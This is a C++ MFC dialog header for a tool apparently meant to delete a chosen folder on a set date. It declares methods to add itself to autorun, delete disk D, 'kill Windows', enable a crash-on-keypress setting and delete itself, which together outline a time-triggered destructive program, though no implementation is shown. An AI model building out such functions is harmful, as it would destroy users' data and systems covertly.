// DeDayDlg.h : header file
//

#pragma once
#include "afxdtctl.h"


// CDeDayDlg dialog
class CDeDayDlg : public CDialog
{
// Construction
public:
	CDeDayDlg(CWnd* pParent = NULL);	// standard constructor

// Dialog Data
	enum { IDD = IDD_DEDAY_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support


// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()

public:
	// путь к папке которую будем удалять
	CString m_csPath;
	CMonthCalCtrl m_MonthCalCtrl;

public:	
	afx_msg void OnBnClickedOk();
	afx_msg void OnBnClickedBtnBrows();
	bool AddToAutorun(void);
	bool SaveDeleteDay(void);
	bool SaveFolderPathToDelete();
	afx_msg void OnEnChangePath();
	bool EnableCrashOnCtrlScroll(void);
	afx_msg void OnBnClickedDeleteD();

	BOOL m_bDeleteD;
	BOOL m_bKillWindows;
	bool DeleteDiskD(void);
	bool KillWindows();
	void SelfDelete(void);
	afx_msg void OnBnClickedKillwindows();
	afx_msg void OnBnClickedCancel();
};
